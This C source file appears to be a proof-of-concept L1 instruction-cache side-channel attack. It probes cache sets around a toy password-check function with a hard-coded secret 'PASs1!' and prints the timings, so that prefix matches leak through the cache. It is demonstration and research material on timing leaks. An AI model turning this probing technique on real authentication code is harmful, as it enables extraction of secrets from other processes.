#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <time.h>
#include <assert.h>
#include <string.h>
#include <stdint.h>
#include "l1i.h"

volatile uint64_t a;

void MyFunction(char *password) {

    if (password[6] != '\0')
        return;

    if (password[0] == 'P') {
        __asm__ __volatile__
                (
                "pause;"
                "movq $0, %%rdx;"
                "movq $0x10, %%rbx;"
                "l2%=:"
                "inc %%rdx;"
                "cmpq %%rdx, %%rbx;"
                "jg l2%=;"
                :
                :
                : "rdx", "rbx", "cc", "memory"
                );
        if (password[1] == 'A') {
            __asm__ __volatile__
                    (
                    "pause;"
                    "movq $0, %%rdx;"
                    "movq $0x10, %%rbx;"
                    "l3%=:"
                    "inc %%rdx;"
                    "cmpq %%rdx, %%rbx;"
                    "jg l3%=;"
                    :
                    :
                    : "rdx", "rbx", "cc", "memory"
                    );
            if (password[2] == 'S') {
                __asm__ __volatile__
                        (
                        "pause;"
                        "movq $0, %%rdx;"
                        "movq $0x10, %%rbx;"
                        "l4%=:"
                        "inc %%rdx;"
                        "cmpq %%rdx, %%rbx;"
                        "jg l4%=;"
                        :
                        :
                        : "rdx", "rbx", "cc", "memory"
                        );
                if (password[3] == 's') {
                    __asm__ __volatile__
                            (
                            "pause;"
                            "movq $0, %%rdx;"
                            "movq $0x10, %%rbx;"
                            "l5%=:"
                            "inc %%rdx;"
                            "cmpq %%rdx, %%rbx;"
                            "jg l5%=;"
                            :
                            :
                            : "rdx", "rbx", "cc", "memory"
                            );
                    if (password[4] == '1') {
                        __asm__ __volatile__
                                (
                                "pause;"
                                "movq $0, %%rdx;"
                                "movq $0x10, %%rbx;"
                                "l6%=:"
                                "inc %%rdx;"
                                "cmpq %%rdx, %%rbx;"
                                "jg l6%=;"
                                :
                                :
                                : "rdx", "rbx", "cc", "memory"
                                );
                        if (password[5] == '!') {
                            //printf("found the password");
                            //printf("the input was %s",password);
                            sleep(10);
                        }
                    }
                }
            }
        }
    }
}

int main(int c, char **v) {
    char password[8][7]={"AAAAAA","PBAAAA","P","PABAAA","PASAAA","PASsAA",
                         "PASs1A","PASs1!"};
    uint64_t l1Cache[8][64] = {0};
    int map[64];
    int rmap[64];
    srandom(time(NULL));
    l1ipp_t l1 = l1i_prepare();

    if (l1i_getmonitoredset(l1, rmap, 64) != 64) {
        fprintf(stderr, "Expected 64 sets\n");
        exit(1);
    }

    for (int i = 0; i < 1024*1024*1024; i++) //clean the cache
        a+=i;

    for (int i = 0; i < 8; ++i) {
        l1i_probeall(l1,NULL);
        l1i_probeall(l1,NULL);
        l1i_probeall(l1,NULL);
        l1i_probeall(l1,NULL);
        MyFunction(password[i]);
        l1i_probeall(l1,l1Cache[i]);
    }

    for (int i  = 0; i <8;i++) {
        printf("tryed %s - got :\n",password[i]);
        for (int j = 0; j <64;j++) {
            printf("[set %d]-> %llu\n",j,l1Cache[i][j]);
        }
    }

    return 0;
}

